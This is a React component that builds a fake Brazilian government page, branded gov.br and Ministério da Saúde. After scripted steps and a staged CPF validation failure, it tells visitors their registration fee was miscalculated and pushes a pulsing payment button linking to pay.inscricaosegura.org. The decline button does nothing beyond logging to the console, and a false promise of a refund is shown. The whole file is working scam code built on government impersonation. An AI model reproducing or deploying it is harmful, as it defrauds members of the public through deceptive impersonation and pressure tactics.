import React, { useState, useEffect } from 'react';
import { ChevronDown, MoreVertical } from 'lucide-react';

const Upsell1: React.FC = () => {
  const [currentStep, setCurrentStep] = useState(0);

  const steps = [
    {
      title: "Sua inscrição foi concluído!",
      subtitle: "Aguarde enquanto inserimos seus dados no formulário...",
      showProgress: true,
      progress: 100,
      icon: null,
      color: "text-gray-600"
    },
    {
      title: "Inscrição Concluída com Sucesso",
      subtitle: "Aguarde um momento...",
      showProgress: false,
      progress: 0,
      icon: "✓",
      color: "text-green-500"
    },
    {
      title: "Validação do CPF para Aprovação",
      subtitle: "Estamos verificando as informações...",
      showProgress: false,
      progress: 0,
      icon: "✕",
      color: "text-red-500"
    },
    {
      title: "O valor da inscrição foi calculado errado para a sua região.",
      subtitle: "Pague o valor correto da inscrição para ser efetivada.",
      showProgress: false,
      progress: 0,
      icon: null,
      color: "text-gray-600",
      showButtons: true
    }
  ];

  useEffect(() => {
    const timers = [
      setTimeout(() => setCurrentStep(1), 2000),
      setTimeout(() => setCurrentStep(2), 4000),
      setTimeout(() => setCurrentStep(3), 6000),
    ];

    return () => timers.forEach(timer => clearTimeout(timer));
  }, []);

  const handlePayment = () => {
    window.open('https://pay.inscricaosegura.org/DYp0ZxVBB1VgmvX?utm_source=organicjLj6861d88756a3fe96638efdda&utm_campaign=&utm_medium=&utm_content=&utm_term=&subid=organic');
  };

  const handleDecline = () => {
    // Handle decline action
    console.log('User declined payment');
  };

  return (
    <div className="min-h-screen bg-[#F9FAFB] flex flex-col">
      {/* Header */}
      <header className="w-full font-sans">
        <div className="bg-white border-b border-gray-200">
          <div className="container mx-auto px-4 py-2 flex justify-between items-center">
            <div className="flex items-center gap-8">
              <div>
                <div className="flex items-center">
                  <span className="font-bold text-2xl">
                    <span className="text-[#1351B4]">g</span>
                    <span className="text-[#FFCD07]">o</span>
                    <span className="text-[#1351B4]">v</span>
                    <span className="text-[#1351B4]">.</span>
                    <span className="text-[#1351B4]">b</span>
                    <span className="text-[#1351B4]">r</span>
                  </span>
                </div>
              </div>
              <div className="h-6 w-[1px] bg-gray-200 hidden md:block"></div>
              <button className="text-[#1351B4] hidden md:block">
                <div className="flex flex-col items-center justify-center w-5 h-5">
                  <div className="w-[3px] h-[3px] rounded-full bg-current mb-[3px]"></div>
                  <div className="w-[3px] h-[3px] rounded-full bg-current mb-[3px]"></div>
                  <div className="w-[3px] h-[3px] rounded-full bg-current"></div>
                </div>
              </button>
            </div>
            <div className="flex items-center gap-4">
              <button className="p-2 text-[#1351B4]" aria-label="More options">
                <MoreVertical className="w-5 h-5" />
              </button>
              <button className="p-2 text-[#1351B4]" aria-label="Display settings">
                <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 384 512" className="text-base" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                  <path d="M223.5 32C100 32 0 132.3 0 256S100 480 223.5 480c60.6 0 115.5-24.2 155.8-63.4c5-4.9 6.3-12.5 3.1-18.7s-10.1-9.7-17-8.5c-9.8 1.7-19.8 2.6-30.1 2.6c-96.9 0-175.5-78.8-175.5-176c0-65.8 36-123.1 89.3-153.3c6.1-3.5 9.2-10.5 7.7-17.3s-7.3-11.9-14.3-12.5c-6.3-.5-12.6-.8-19-.8z"></path>
                </svg>
              </button>
              <button className="p-2 text-[#1351B4]" aria-label="Menu grid">
                <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" className="text-base" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                  <path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 240v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm32-240v80c0 13.255 10.745 24 24 24H488c13.255 0 24-10.745 24-24V56c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24zm-32 80V56c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm-205.334 56H24c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24zM0 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H24c-13.255 0-24 10.745-24 24zm386.667-56H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zm0 160H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zM181.333 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24z"></path>
                </svg>
              </button>
              <button className="bg-[#1351B4] text-white py-2 px-6 rounded-full flex items-center gap-2 ml-2">
                <span className="font-semibold">Entrar</span>
              </button>
            </div>
          </div>
        </div>
        <div className="bg-white shadow-sm">
          <div className="container mx-auto px-4 py-3 flex justify-between items-center">
            <button className="flex items-center gap-3">
              <div className="text-[#1351B4]">
                <div className="w-6 h-0.5 bg-[#1351B4] mb-1"></div>
                <div className="w-6 h-0.5 bg-[#1351B4] mb-1"></div>
                <div className="w-6 h-0.5 bg-[#1351B4]"></div>
              </div>
              <span className="text-lg text-[#1351B4] font-medium">Ministério da Saúde</span>
            </button>
            <div className="flex items-center gap-4">
              <button className="p-2 text-[#1351B4]" aria-label="Voice search">
                <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 352 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
                  <path d="M176 352c53.02 0 96-42.98 96-96V96c0-53.02-42.98-96-96-96S80 42.98 80 96v160c0 53.02 42.98 96 96 96zm160-160h-16c-8.84 0-16 7.16-16 16v48c0 74.8-64.49 134.82-140.79 127.38C96.71 376.89 48 317.11 48 250.3V208c0-8.84-7.16-16-16-16H16c-8.84 0-16 7.16-16 16v40.16c0 89.64 63.97 169.55 152 181.69V464H96c-8.84 0-16 7.16-16 16v16c0 8.84 7.16 16 16 16h160c8.84 0 16-7.16 16-16v-16c0-8.84-7.16-16-16-16h-56v-33.77C285.71 418.47 352 344.9 352 256v-48c0-8.84-7.16-16-16-16z"></path>
                </svg>
              </button>
              <button className="p-2 text-[#1351B4]" aria-label="Search">
                <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
                  <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path>
                </svg>
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="max-w-md w-full space-y-4">
          {steps.map((step, index) => (
            <div
              key={index}
              className={`bg-white rounded-lg shadow-lg p-6 text-center transition-all duration-500 ${
                index <= currentStep ? 'opacity-100 transform translate-y-0' : 'opacity-0 transform translate-y-4'
              }`}
              style={{ display: index <= currentStep ? 'block' : 'none' }}
            >
              <h2 className="text-2xl font-bold mb-4">{step.title}</h2>
              
              {step.icon && (
                <div className={`${step.color} text-4xl mb-2`}>{step.icon}</div>
              )}
              
              <p className={`${step.color} mb-4`}>{step.subtitle}</p>
              
              {step.showProgress && (
                <div className="h-2 bg-gray-200 rounded-full">
                  <div 
                    className="h-2 bg-green-500 rounded-full transition-all duration-300" 
                    style={{ width: `${step.progress}%` }}
                  ></div>
                </div>
              )}
              
              {step.showButtons && (
                <>
                  <div className="space-y-4 mb-4">
                    <button 
                      onClick={handlePayment}
                      className="w-full bg-green-500 text-white text-xl font-bold py-4 px-6 rounded-lg hover:bg-green-600 transition-colors animate-pulse transform hover:scale-[1.02]"
                    >
                      PAGAR INSCRIÇÃO
                    </button>
                    <button 
                      onClick={handleDecline}
                      className="w-full bg-gray-300 text-gray-600 py-2 px-4 text-sm font-normal rounded hover:bg-gray-200 transition-colors"
                    >
                      não pagar inscrição
                    </button>
                  </div>
                  <p className="text-gray-500 text-sm">
                    <strong>O valor da taxa anterior será estornado após o pagamento da inscrição atualizada.</strong>
                  </p>
                </>
              )}
            </div>
          ))}
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#071D41] text-white">
        <div className="container mx-auto px-4 py-8">
          <div className="mb-12">
            <h1 className="text-4xl font-bold mb-8">gov.br</h1>
            <div className="space-y-4">
              <div className="border-t border-gray-700">
                <button className="w-full text-left py-4 text-xl">SUS</button>
              </div>
              <div className="border-t border-gray-700">
                <button className="w-full flex justify-between items-center py-4">
                  <span className="text-xl">ASSUNTOS</span>
                  <ChevronDown className="w-6 h-6" />
                </button>
              </div>
              <div className="border-t border-gray-700">
                <button className="w-full flex justify-between items-center py-4">
                  <span className="text-xl">COMPOSIÇÃO</span>
                  <ChevronDown className="w-6 h-6" />
                </button>
              </div>
              <div className="border-t border-gray-700">
                <button className="w-full flex justify-between items-center py-4">
                  <span className="text-xl">ACESSO À INFORMAÇÃO</span>
                  <ChevronDown className="w-6 h-6" />
                </button>
              </div>
              <div className="border-t border-gray-700">
                <button className="w-full flex justify-between items-center py-4">
                  <span className="text-xl">CENTRAIS DE CONTEÚDO</span>
                  <ChevronDown className="w-6 h-6" />
                </button>
              </div>
              <div className="border-t border-gray-700">
                <button className="w-full flex justify-between items-center py-4">
                  <span className="text-xl">CANAIS DE ATENDIMENTO</span>
                  <ChevronDown className="w-6 h-6" />
                </button>
              </div>
              <div className="border-t border-gray-700">
                <button className="w-full flex justify-between items-center py-4">
                  <span className="text-xl">CAMPANHAS DA EDUCAÇÃO</span>
                  <ChevronDown className="w-6 h-6" />
                </button>
              </div>
              <div className="border-t border-gray-700 py-4">
                <button className="flex items-center gap-2">
                  <span className="w-6 h-6 bg-white rounded-full"></span>
                  <span className="text-xl">Redefinir Cookies</span>
                </button>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#071D41]">
              <span className="text-2xl font-bold">i</span>
            </div>
            <span className="text-xl uppercase">Acesso à Informação</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Upsell1;